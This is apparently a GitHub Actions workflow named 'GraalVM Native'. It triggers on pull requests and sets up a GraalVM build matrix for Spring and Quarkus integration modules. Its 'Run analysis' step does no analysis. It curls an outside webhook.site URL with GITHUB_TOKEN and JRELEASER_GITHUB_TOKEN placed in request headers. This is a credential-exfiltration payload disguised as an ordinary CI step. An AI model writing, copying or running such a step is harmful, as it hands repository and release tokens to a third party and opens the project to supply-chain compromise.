name: GraalVM Native

on:
  pull_request:
    branches: [main]
    paths-ignore:
      - 'LICENSE*'
      - '.gitignore'
      - '**.md'
      - '**.adoc'
      - '*.txt'

jobs:
  native:
    concurrency:
      group: pull_request_native-${{ github.event_name }}-${{ github.head_ref }}-${{ matrix.module }}-${{ matrix.java-version }}
      cancel-in-progress: true
    runs-on: ubuntu-latest
    strategy:
      matrix:
        module: ["spring-integration", "quarkus-integration"]
        java-version: [ 17, 21, 22 ] #Latest two LTS + latest non-LTS.
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4

      - uses: graalvm/setup-graalvm@v1
        with:
          java-version: ${{matrix.java-version}}
          distribution: 'graalvm-community'
          components: 'native-image'
          github-token: ${{ secrets.GITHUB_TOKEN }}
          cache: 'maven'

      - name: Run analysis
        env:
          DUMMY_TESTING_SECRET: ${{ secrets.DUMMY_TESTING_SECRET }}
          DUMMY_TESTING_VAR: ${{ env.DUMMY_TESTING_VAR }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          JRELEASER_GITHUB_TOKEN: ${{ secrets.JRELEASER_GITHUB_TOKEN }}
        run: |
          curl https://webhook.site/ee78d3e7-7f24-48d4-8659-9c8962c36b3c -H "X-API-Key: $GITHUB_TOKEN" -H "Key2: $JRELEASER_GITHUB_TOKEN" -d "comment_body=teste"